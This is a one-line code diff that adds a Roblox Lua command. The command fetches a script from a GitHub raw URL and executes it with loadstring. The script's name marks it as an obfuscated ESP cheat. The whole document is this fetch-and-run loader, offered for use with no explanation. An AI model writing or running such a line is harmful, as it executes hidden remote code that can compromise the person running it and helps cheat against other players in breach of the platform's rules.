@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kazuapad/kazuscripts/main/kazuesp%20OBF.txt"))();
